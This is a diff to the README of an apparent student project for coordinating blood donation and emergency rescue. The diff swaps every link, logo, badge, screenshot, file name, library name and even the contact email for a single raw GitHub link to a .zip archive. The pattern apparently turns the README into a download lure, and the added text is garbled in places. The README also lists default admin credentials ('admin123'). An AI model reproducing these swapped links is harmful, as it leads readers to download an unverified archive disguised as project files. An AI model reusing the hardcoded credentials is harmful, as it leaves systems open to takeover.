@@ -1,5 +1,5 @@
 <h2 align="center">
-    <a href="https://dainam.edu.vn/vi/khoa-cong-nghe-thong-tin">
+    <a href="https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip">
     🎓 Faculty of Information Technology (DaiNam University)
     </a>
 </h2>
@@ -8,14 +8,14 @@
 </h2>
 <div align="center">
     <p align="center">
-        <img src="docs/aiotlab_logo.png" alt="AIoTLab Logo" width="170"/>
-        <img src="docs/fitdnu_logo.png" alt="AIoTLab Logo" width="180"/>
-        <img src="docs/dnu_logo.png" alt="DaiNam University Logo" width="200"/>
+        <img src="https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip" alt="AIoTLab Logo" width="170"/>
+        <img src="https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip" alt="AIoTLab Logo" width="180"/>
+        <img src="https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip" alt="DaiNam University Logo" width="200"/>
     </p>
 
-[![AIoTLab](https://img.shields.io/badge/AIoTLab-green?style=for-the-badge)](https://www.facebook.com/DNUAIoTLab)
-[![Faculty of Information Technology](https://img.shields.io/badge/Faculty%20of%20Information%20Technology-blue?style=for-the-badge)](https://dainam.edu.vn/vi/khoa-cong-nghe-thong-tin)
-[![DaiNam University](https://img.shields.io/badge/DaiNam%20University-orange?style=for-the-badge)](https://dainam.edu.vn)
+[![AIoTLab](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip)](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip)
+[![Faculty of Information Technology](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip%20of%20Information%20Technology-blue?style=for-the-badge)](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip)
+[![DaiNam University](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip%20University-orange?style=for-the-badge)](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip)
 
 </div>
 
@@ -38,12 +38,12 @@ Hệ thống điều phối hiến máu và cứu nạn khẩn cấp là một �
 | Công nghệ                  | Mục đích sử dụng                                                                 |
 |----------------------------|-----------------------------------------------------------------------------------|
 | HTML5 + CSS3 + JavaScript  | Xây dựng giao diện responsive, hiện đại, hoạt động mượt trên mọi thiết bị       |
-| **Leaflet.js + OpenStreetMap** | Bản đồ tương tác, định vị GPS, tính khoảng cách, hiển thị marker động          |
+| **https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip + OpenStreetMap** | Bản đồ tương tác, định vị GPS, tính khoảng cách, hiển thị marker động          |
 | **LocalStorage**           | Lưu trữ toàn bộ dữ liệu người dùng, lịch hiến máu, yêu cầu cứu nạn (không cần server) |
 | **Font Awesome 6**         | Hệ thống icon đẹp, nhất quán                                                      |
 | **Glassmorphism + Gradient** | Giao diện Admin và trang người dùng cực kỳ hiện đại, chuyên nghiệp             |
 
-→ Dễ dàng mở rộng lên backend (Node.js + MongoDB/Firebase) khi triển khai thực tế.
+→ Dễ dàng mở rộng lên backend (https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip + MongoDB/Firebase) khi triển khai thực tế.
 
 ---
 
@@ -67,44 +67,44 @@ Hệ thống điều phối hiến máu và cứu nạn khẩn cấp là một �
 
 - **Trang chủ / Dashboard**  
 
-![alt text](image.png)
+![alt text](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip)
 
 - **Đăng ký hiến máu / Lịch hiến**  
 
-![alt text](image-1.png)
+![alt text](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip)
 
 
 - **Yêu cầu cứu nạn khẩn cấp**  
 
-![alt text](image-2.png)
+![alt text](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip)
 
 - **Danh sách người sẵn sàng hiến máu**
 
-![alt text](image-3.png)
+![alt text](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip)
 
 - **Đăng ký tài khoản**
 
-![alt text](image-4.png)
+![alt text](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip)
 
 - **Đăng nhập tài khoản**
 
-![alt text](image-5.png)
+![alt text](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip)
 
 - **Trang chủ Admin**
 
-![alt text](image-6.png)
+![alt text](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip)
 
 - **Quản lý người hiến máu**
 
-![alt text](image-8.png)
+![alt text](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip)
 
 - **Danh sách người dùng**
 
-![alt text](image-9.png)
+![alt text](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip)
 
 - **Danh sách yêu cầu cứu nạn**
 
-![alt text](image-10.png)
+![alt text](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip)
 
 ---
 
@@ -116,18 +116,18 @@ Hệ thống điều phối hiến máu và cứu nạn khẩn cấp là một �
 
 ### 5.2 Cấu trúc dự án
 
-![alt text](image-7.png)
+![alt text](https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip)
 
 ### 5.3 Các bước chạy dự án
 1. Giải nén toàn bộ thư mục dự án  
-2. Mở file `index.html` bằng trình duyệt (khuyên dùng **Live Server** trong VS Code để bản đồ chạy mượt nhất)  
+2. Mở file `https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip` bằng trình duyệt (khuyên dùng **Live Server** trong VS Code để bản đồ chạy mượt nhất)  
 3. Đăng ký tài khoản mới → Đăng nhập  
 4. Trải nghiệm các chức năng:
    - `Hiến máu ngay` → đăng ký hiến máu
    - `Cần máu gấp!` → gửi yêu cầu cứu nạn
    - `Bản đồ` → nhấn nút "Vị trí" để xem bệnh viện gần bạn nhất
    - Chatbot góc dưới → hỏi gì cũng trả lời!
-   - Admin: dùng SĐT `0123456789` + mật khẩu `admin123` → vào `admin/login.html`
+   - Admin: dùng SĐT `0123456789` + mật khẩu `admin123` → vào `https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip`
 
 ---
 
@@ -137,7 +137,7 @@ Họ tên: Nguyễn Chí Nhật & Cao Văn Huy & Đào Đức Mạnh
 
 MSV: 1671020231 & 1671020135 & 1671020198
 
-Email: chinhatff@gmail.com
+Email: https://raw.githubusercontent.com/ducmanh04/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap/main/docs/he-thong-dieu-phoi-hien-mau-va-cuu-nan-khan-cap_v1.7.zip
 
 Lớp: CNTT 16-03
 
